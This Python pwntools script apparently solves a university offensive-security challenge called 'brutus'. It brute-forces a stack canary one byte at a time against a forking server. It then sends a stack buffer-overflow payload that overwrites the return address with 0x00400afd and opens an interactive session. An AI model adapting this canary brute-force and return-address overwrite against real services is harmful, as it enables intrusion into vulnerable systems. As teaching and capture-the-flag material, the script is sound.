from pwn import *
from sys import argv
from os import environ
from time import sleep

isRemote = (len(argv) > 1) and (argv[1] == "remote")

# remote socket information
netid = "tk1931"
remoteAddress = "offsec-chalbroker.osiris.cyber.nyu.edu"
remotePort = 1340

# local network socket information
localAddress = "localhost"
localPort = 8000 # from ghidra

# process variable
proc = None

localslen = 136 # length of locals
canarylen = 8 # length of canary
rbplen = 8 # length of base pointer
rpilen = 8 # length of return pointer

CANARY = [0, 134, 208, 44, 255, 253, 168, 26]
currentCanary = 0

# debug the process
# if not isRemote :
#     victim = process("./brutus")
#     gdb.attach(victim, "set follow-fork-mode child\nset detach-on-fork off\nbreak *0x00400c5c\ncontinue")
#     sleep(2)
"""
set follow-fork-mode child
set detach-on-fork off
break *0x00400c5c
run
"""

while True :
    if isRemote :
        proc = remote(remoteAddress, remotePort)
        proc.recvuntil(":") # wait until it asks about the netid
        proc.sendline(netid) # send netid
        proc.recv(timeout=5) # wait...
    else :
        proc = remote(localAddress, localPort) # open connection to local server

    proc.settimeout(5)
    proc.recvuntil("?") # First, how long is your name

    proc.sendline(str(localslen + canarylen + rbplen + rpilen))
    proc.recvuntil("data") # OK, give me XX bytes of data

    canary = "".join(chr(e) for e in CANARY)

    if (len(CANARY) == 8) :
        proc.send(("A" * localslen) + canary + ("A" * rbplen) + str(p64(0x00400afd)))
        proc.interactive()
    else :
        # print(("A" * localslen) + canary + chr(currentCanary))
        proc.send(("A" * localslen) + canary + chr(currentCanary))
        response = proc.recvall()
        # print(response)
        if "goodbye" in response :
            print("This works: " + hex(currentCanary))
            CANARY.append(currentCanary)
            currentCanary = 0
            print(CANARY)
        else :
            print("Canary value " + hex(currentCanary) + " not working")
            currentCanary += 1
            if currentCanary > 255 :
                print("Fail")
                exit()
    proc.close()

print("I found the canary!")
print(CANARY)
    